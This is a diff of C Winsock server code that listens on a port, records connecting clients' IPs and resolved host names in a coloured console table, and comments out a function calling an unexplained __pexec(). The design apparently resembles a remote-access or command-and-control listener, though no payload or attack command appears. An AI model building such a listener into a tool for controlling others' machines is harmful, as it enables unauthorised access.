@@ -32,7 +32,7 @@ int GetClient()
     bind(Sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
 
     listen(Sock, SOMAXCONN);
-    printf(PURPLE"\nLooking for connections on port [%d]"BLACK, CTX.dstport);
+    printf(PURPLE"\nLooking for connections on port ["BLUE"%d"PURPLE"]"BLACK, CTX.dstport);
 
     while (1)
     {
@@ -53,20 +53,25 @@ int GetClient()
         }
 
         clients[count].Socket = clientSock;
-
 		strcpy(clients[count].IP, inet_ntoa(ClientAddr.sin_addr));
+
+        if (getnameinfo((SOCKADDR*)&ClientAddr, sizeof(ClientAddr), clients[count].HOST, sizeof(clients[count].HOST), NULL, 0, 0) != 0)
+        {
+            fprintf(stderr, "\r\n[-] Failed to retrive host name%d", WSAGetLastError());
+            return -1;
+        }
 
         count++;
 
-        printf(GREEN"\n================== CLIENTS ==================\n"BLACK);
+        printf(GREEN"\n\n\n================== CLIENTS ==================\n"BLACK);
         printf(GREEN"\nID _____________ IP ___________________ HOST"BLACK);
 
         for (int i = 0; i < count; i++)
         {
-            printf(GREEN"\n%d _____________ %s _______________ %s"BLACK, i, clients[i].IP);
+            printf(GREEN"\r\n[%d] _____________ [%s] _______________ [%s]"BLACK, i, clients[i].IP, clients[i].HOST);
         }
 
-    }
+    } 
 
     closesocket(Sock);
     WSACleanup();
@@ -75,11 +80,13 @@ int GetClient()
 
 }
 
+/*
 int select(const char* ip)
 {
 	//recv(clients[0].Socket, NULL, 0, 0);
     __pexec();
     return 0;
 }
+*/
 
 #endif
